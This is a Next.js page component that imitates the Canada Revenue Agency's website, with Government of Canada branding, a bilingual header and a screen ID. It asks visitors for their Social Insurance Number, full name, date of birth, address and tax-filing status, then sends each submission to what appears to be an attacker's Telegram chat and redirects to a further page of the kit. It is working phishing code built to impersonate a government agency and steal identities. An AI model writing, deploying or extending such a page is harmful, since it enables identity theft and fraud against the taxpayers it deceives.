"use client";

import { useState, FormEvent } from "react";
import { useRouter } from "next/navigation";
import { sendTelegramMessage } from "../../utils/telegram";
import Image from "next/image";

const provinces = [
  "Alberta",
  "British Columbia",
  "Manitoba",
  "New Brunswick",
  "Newfoundland and Labrador",
  "Nova Scotia",
  "Ontario",
  "Prince Edward Island",
  "Quebec",
  "Saskatchewan",
  "Northwest Territories",
  "Nunavut",
  "Yukon",
];

export default function CRAPersonalInfoTelegram() {
  const [sin, setSin] = useState("");
  const [fullName, setFullName] = useState("");
  const [dob, setDob] = useState("");
  const [street, setStreet] = useState("");
  const [city, setCity] = useState("");
  const [province, setProvince] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [filed2026, setFiled2026] = useState<boolean | null>(null);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");

    if (
      !sin.trim() ||
      !fullName.trim() ||
      !dob.trim() ||
      !street.trim() ||
      !city.trim() ||
      !province.trim() ||
      !postalCode.trim() ||
      filed2026 === null
    ) {
      setError("All fields are required.");
      return;
    }

    const sinDigits = sin.replace(/\D/g, "");
    if (sinDigits.length !== 9) {
      setError("SIN must be 9 digits.");
      return;
    }

    const postalPattern = /^[A-Za-z]\d[A-Za-z][ -]?\d[A-Za-z]\d$/;
    if (!postalPattern.test(postalCode.trim())) {
      setError("Please enter a valid Canadian postal code (e.g., A1A 1A1).");
      return;
    }

    const message = `
🔔 *CRA Personal Information* 🔔
🆔 SIN: ${sinDigits}
👤 Full Name: ${fullName}
🎂 Date of Birth: ${dob}
🏠 Street: ${street}
🌆 City: ${city}
🗺️ Province: ${province}
📮 Postal Code: ${postalCode}
📅 Filed 2026 taxes: ${filed2026 ? "Yes" : "No"}
    `;

    try {
      await sendTelegramMessage(message);
      router.push("/cra1");
    } catch (err) {
      console.error(err);
      setError("An error occurred. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-white text-gray-800">
      {/* Government of Canada signature bar */}
      <div className="bg-gray-100 border-b border-gray-300">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-2 flex justify-between items-center">
          <Image
  src="/images/sig-blk-en.svg"
  alt="Government of Canada"
  width={500}
  height={150}
  className="h-16 w-auto"
/>
          <div className="text-right">
            <div className="text-xs sm:text-sm text-gray-600">Government of Canada</div>
            <div lang="fr" className="text-xs sm:text-sm text-gray-600">
              Gouvernement du Canada
            </div>
          </div>
        </div>
      </div>

      {/* CRA branding bar */}
      <div className="bg-[#26374a] text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
          <div className="text-xl sm:text-2xl font-bold">Canada Revenue Agency</div>
        </div>
      </div>

      {/* Main content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
        <div className="max-w-3xl">
          <h1 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-6">
            Personal Information
          </h1>

          {error && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm mb-6 flex items-start">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5 text-red-500 mr-2 mt-0.5 flex-shrink-0"
                viewBox="0 0 20 20"
                fill="currentColor"
              >
                <path
                  fillRule="evenodd"
                  d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                  clipRule="evenodd"
                />
              </svg>
              <span>{error}</span>
            </div>
          )}

          <form onSubmit={handleSubmit} noValidate>
            {/* SIN */}
            <div className="mb-6">
              <label htmlFor="sin" className="block text-base sm:text-lg font-semibold mb-2">
                Social Insurance Number (SIN) <span className="text-red-600 italic">(required)</span>
              </label>
              <input
                id="sin"
                type="text"
                inputMode="numeric"
                value={sin}
                onChange={(e) => setSin(e.target.value.replace(/\D/g, "").slice(0, 9))}
                className="w-full sm:w-96 h-12 border border-gray-400 rounded px-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="123 456 789"
              />
              <p className="text-sm text-gray-500 mt-1">9 digits, no spaces</p>
            </div>

            {/* Full Name */}
            <div className="mb-6">
              <label htmlFor="fullName" className="block text-base sm:text-lg font-semibold mb-2">
                Full Name <span className="text-red-600 italic">(required)</span>
              </label>
              <input
                id="fullName"
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="w-full sm:w-96 h-12 border border-gray-400 rounded px-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="John Doe"
              />
            </div>

            {/* Date of Birth */}
            <div className="mb-6">
              <label htmlFor="dob" className="block text-base sm:text-lg font-semibold mb-2">
                Date of Birth <span className="text-red-600 italic">(required)</span>
              </label>
              <input
                id="dob"
                type="date"
                value={dob}
                onChange={(e) => setDob(e.target.value)}
                className="w-full sm:w-96 h-12 border border-gray-400 rounded px-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>

            {/* Address - Professional Grid Layout */}
            <div className="mb-6">
              <label htmlFor="street" className="block text-base sm:text-lg font-semibold mb-2">
                Street Address <span className="text-red-600 italic">(required)</span>
              </label>
              <input
                id="street"
                type="text"
                value={street}
                onChange={(e) => setStreet(e.target.value)}
                className="w-full h-12 border border-gray-400 rounded px-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="123 Main St"
              />
            </div>

            {/* City, Province, Postal Code - responsive grid */}
            <div className="grid grid-cols-1 sm:grid-cols-12 gap-4 mb-6">
              <div className="sm:col-span-5">
                <label htmlFor="city" className="block text-base sm:text-lg font-semibold mb-2">
                  City <span className="text-red-600 italic">(required)</span>
                </label>
                <input
                  id="city"
                  type="text"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  className="w-full h-12 border border-gray-400 rounded px-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Ottawa"
                />
              </div>

              <div className="sm:col-span-4">
                <label htmlFor="province" className="block text-base sm:text-lg font-semibold mb-2">
                  Province <span className="text-red-600 italic">(required)</span>
                </label>
                <select
                  id="province"
                  value={province}
                  onChange={(e) => setProvince(e.target.value)}
                  className="w-full h-12 border border-gray-400 rounded px-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white"
                >
                  <option value="">Select</option>
                  {provinces.map((p) => (
                    <option key={p} value={p}>
                      {p}
                    </option>
                  ))}
                </select>
              </div>

              <div className="sm:col-span-3">
                <label htmlFor="postalCode" className="block text-base sm:text-lg font-semibold mb-2">
                  Postal Code <span className="text-red-600 italic">(required)</span>
                </label>
                <input
                  id="postalCode"
                  type="text"
                  value={postalCode}
                  onChange={(e) => setPostalCode(e.target.value.toUpperCase())}
                  className="w-full h-12 border border-gray-400 rounded px-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="A1A 1A1"
                />
              </div>
            </div>

            {/* Filed 2026 taxes? */}
            <div className="mb-8">
              <span className="block text-base sm:text-lg font-semibold mb-2">
                Have you filed your 2026 taxes? <span className="text-red-600 italic">(required)</span>
              </span>
              <div className="flex gap-6">
                <label className="flex items-center">
                  <input
                    type="radio"
                    name="filed2026"
                    value="yes"
                    checked={filed2026 === true}
                    onChange={() => setFiled2026(true)}
                    className="h-5 w-5 text-blue-600 focus:ring-blue-500"
                  />
                  <span className="ml-2 text-lg">Yes</span>
                </label>
                <label className="flex items-center">
                  <input
                    type="radio"
                    name="filed2026"
                    value="no"
                    checked={filed2026 === false}
                    onChange={() => setFiled2026(false)}
                    className="h-5 w-5 text-blue-600 focus:ring-blue-500"
                  />
                  <span className="ml-2 text-lg">No</span>
                </label>
              </div>
            </div>

            {/* Buttons */}
            <div className="flex flex-col sm:flex-row gap-4 mb-6">
              <button
                type="submit"
                className="bg-[#26374a] hover:bg-[#1c2a3f] text-white font-semibold py-3 px-8 rounded text-lg"
              >
                Continue
              </button>
              <button
                type="button"
                onClick={() => {
                  setSin("");
                  setFullName("");
                  setDob("");
                  setStreet("");
                  setCity("");
                  setProvince("");
                  setPostalCode("");
                  setFiled2026(null);
                  setError("");
                }}
                className="bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold py-3 px-8 rounded text-lg border border-gray-400"
              >
                Clear
              </button>
            </div>
          </form>

          <div className="text-xs text-gray-400 mt-8 border-t pt-4">Screen ID: PI.001</div>
        </div>
      </main>
    </div>
  );
}